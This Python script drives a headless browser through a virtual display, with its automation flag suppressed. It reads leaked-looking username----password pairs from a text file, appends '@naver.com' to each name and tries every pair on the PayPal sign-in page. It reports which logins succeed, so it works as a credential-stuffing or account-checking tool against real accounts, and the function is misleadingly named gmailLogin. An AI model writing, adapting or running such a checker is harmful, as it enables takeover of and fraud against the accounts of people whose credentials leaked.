import asyncio
import time
from pyppeteer import launch
from pyppeteer.errors import ElementHandleError, NetworkError
from pyvirtualdisplay import Display
import sys
import nest_asyncio
import logging


nest_asyncio.apply()


async def gmailLogin(url, fileName, endFix):
    display = Display(visible=0, size=(800, 800))
    display.start()
    browser = await launch(
        options={
            'headless': False,
            'ignoreDefaultArgs': ['--enable-automation'],
            'args': ['--no-sandbox', '--disable-gpu'],
        })
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()
    file = open(fileName)
    line = file.readline()  # 调用文件的 readline()方法
    if line == None:
        return
    while line:
        strlist = line.split('----')
        username = strlist[0] + endFix
        password = strlist[1].split('\n')[0]
        start = time.perf_counter()
        # await page.close()
        # await context.close()
        # await browser.close()
        # browser = await launch(
        #     options={
        #         'headless': False,
        #         'ignoreDefaultArgs': ['--enable-automation'],
        #         # 'args': ['--no-sandbox', '--disable-gpu'],
        #         # 'dumpio': True
        #     })
        # context = await browser.createIncognitoBrowserContext()
        # page = await context.newPage()
        # res = await test(page, username, password, url, context)
        try:
            await page.close()
            await context.close()
            await browser.close()
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
            res = await test(page, username, password, url)
        except Exception as e:
            logging.exception(e)
        end = time.perf_counter()
        yongshi = end - start
        print("total==============", yongshi)
        line = file.readline()
    file.close()
    await page.close()
    await context.close()
    await browser.close()


async def test(page, username, password, url):
    await page.goto(url)
    time.sleep(2)
    await page.type('#email', username)
    # 点击下一步
    await page.click('#btnNext')
    time.sleep(2)
    await page.type('#password', password)
    await page.click('#btnLogin')
    await page.waitForNavigation()
    time.sleep(2)
    element = await page.querySelector("#backToInputEmailLink")
    if element != None:
        print("密码错误", username, "----", password)
    else:
        print("success", username, "----", password)


if __name__ == '__main__':
    file = "3333.txt"
    endFix = "@naver.com"
    url = 'https://www.paypal.com/signin?locale.x=zh_C2'
    loop = asyncio.get_event_loop()
    loop.run_until_complete(gmailLogin(url, file, endFix))
